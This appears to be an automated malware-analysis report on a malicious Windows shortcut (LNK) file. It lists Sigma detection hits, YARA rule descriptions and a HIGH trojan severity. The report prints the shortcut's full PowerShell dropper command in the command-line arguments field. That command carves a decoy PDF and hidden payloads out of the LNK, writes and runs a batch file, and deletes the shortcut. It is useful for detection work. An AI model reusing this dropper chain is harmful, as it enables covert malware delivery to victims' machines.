sigma_analysis_results.rule_title: Dot net compiler compiles file from suspicious location
sigma_analysis_results.rule_description: Dot net compiler compiles file from suspicious location

match_context.values: @{Product=Microsoft\xae .NET Framework; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=csc.exe; Hashes=MD5=EB80BB1CA9B9C7F516FF69AFCFD75B7D,SHA256=38C407DBF41E99396B78D00DD796930D8838DCB4AF77C3F23BA0E800D1213EBE,IMPHASH=950FB6F62526333E663D35BA72D19DDC; Description=Visual C# Command Line Compiler; FileVersion=4.8.4084.0 built by: NET48REL1; ParentCommandLine=C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe  -windowstyle hidden -NoExit "$stringPath=$env:temp+'\'+'toy02.dat';$stringByte = Get-Content -path $stringPath -encoding byte;$string = [System.Text.Encoding]::UTF8.GetString($stringByte);$scriptBlock = [scriptblock]::Create($string);Invoke-Command $scriptBlock;"; CommandLine="C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Bruno\AppData\Local\Temp\2te1kbjf\2te1kbjf.cmdline"; EventID=1; ParentImage=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Powerup tool's Write Hijack DLL exploits DLL hijacking for privilege escalation.
In it's default mode, it builds a self deleting .bat file which executes malicious command.
The detection rule relies on creation of the malicious bat file (debug.bat by default).

match_context.values: @{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\toy03.bat; EventID=11}

sigma_analysis_results.rule_title: Read Contents From Stdin Via Cmd.EXE
sigma_analysis_results.rule_description: Detect the use of "<" to read and potentially execute a file via cmd.exe

match_context.values: @{CommandLine=C:\Windows\SysWOW64\cmd.exe /k for /f tokens=* %a in (dir C:\\Windows\\SysWow64\\WindowsPowerShell\\v1.0\\*rshell.exe /s /b /od) do call %a $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = 'C:\Users\<USER>\AppData\Local\Temp'};$exs=@('.lnk');$lnkPath = Get-ChildItem -Path $dirPath -Recurse *.* -File | where {$_.extension -in $exs} | where-object {$_.length -eq 0x031732EF} | Select-Object -ExpandProperty FullName ;$lnkFile=New-Object System.I [TRUNCATED]; Image=C:\Windows\SysWOW64\cmd.exe; EventID=1}

sigma_analysis_results.rule_description: Once established within a system or network, an adversary may use automated techniques for collecting internal data.

sigma_analysis_results.rule_description: Detects execution of "csc.exe" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages.

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.

match_context.values: @{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\toy03.bat}

sigma_analysis_results.rule_description:
When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution

match_context.values: @{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\2te1kbjf\2te1kbjf.cmdline}
@{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\ekkwcslq\ekkwcslq.cmdline}
@{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\qt1cxrfl\qt1cxrfl.cmdline; EventID=11}
@{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\3jsonw2q\3jsonw2q.cmdline}

sigma_analysis_results.rule_title: File And SubFolder Enumeration Via Dir Command
sigma_analysis_results.rule_description: Detects usage of the "dir" command part of Widows CMD with the "/S" command line flag in order to enumerate files in a specified directory and all subdirectories.

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

exiftool.Flags: Description, CommandArgs, IconFile, Unicode, ExpString, PreferEnvPath

lnk_info.command_line_arguments: /k for /f "tokens=*" %a in ('dir C:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe /s /b /od') do call %a "$dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'};$exs=@('.lnk');$lnkPath = Get-ChildItem -Path $dirPath -Recurse *.* -File | where {$_.extension -in $exs} | where-object {$_.length -eq 0x031732EF} | Select-Object -ExpandProperty FullName ;$lnkFile=New-Object System.IO.FileStream($lnkPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read);$lnkFile.Seek(0x000010E4, [System.IO.SeekOrigin]::Begin);$pdfFile=New-Object byte[] 0x002A7965;$lnkFile.Read($pdfFile, 0, 0x002A7965);$pdfPath = $lnkPath.replace('.lnk','.pdf');sc $pdfPath $pdfFile -Encoding Byte;& $pdfPath;$lnkFile.Seek(0x002A8A49,[System.IO.SeekOrigin]::Begin);$exeFile=New-Object byte[] 0x000D9190;$lnkFile.Read($exeFile, 0, 0x000D9190);$exePath=$env:temp+'\toy01.dat';sc $exePath $exeFile -Encoding Byte;$lnkFile.Seek(0x00381BD9,[System.IO.SeekOrigin]::Begin);$stringByte = New-Object byte[] 0x00000634;$lnkFile.Read($stringByte, 0, 0x00000634); $batStrPath = $env:temp+'\'+'toy02.dat';$string = [Text.Encoding]::GetEncoding('utf-8').GetString($stringByte);$string | Out-File -FilePath $batStrPath -Encoding ascii;$lnkFile.Seek(0x0038220D,[System.IO.SeekOrigin]::Begin);$batByte = New-Object byte[] 0x0000014C;$lnkFile.Read($batByte, 0, 0x0000014C);$executePath = $env:temp+'\'+'toy0'+'3.b'+'a'+'t'; Write-Host $executePath; Write-Host $batStrPath; $bastString = [System.Text.Encoding]::UTF8.GetString($batByte);$bastString | Out-File -FilePath $executePath -Encoding ascii; &$executePath; $lnkFile.Close();[System.IO.File]::Delete($lnkPath);"&& exit

crowdsourced_yara_results.description: This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Detects suspicious single byte XORed keyword 'Mozilla/5.0' - it uses yara's XOR modifier and therefore cannot print the XOR key. You can use the CyberChef recipe linked in the reference field to brute force the used key.
crowdsourced_yara_results.author: Florian Roth

crowdsourced_yara_results.description: Detects a suspiciously big LNK file - maybe with embedded content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: Identifies PowerShell artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies archive (compressed) files in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies execution artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies Adobe Acrobat artefacts in shortcut (LNK) files. A PDF document is typically used as decoy in a malicious LNK.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file larger than 100KB. Most goodware LNK files are smaller than 100KB.
crowdsourced_yara_results.author: @bartblaze
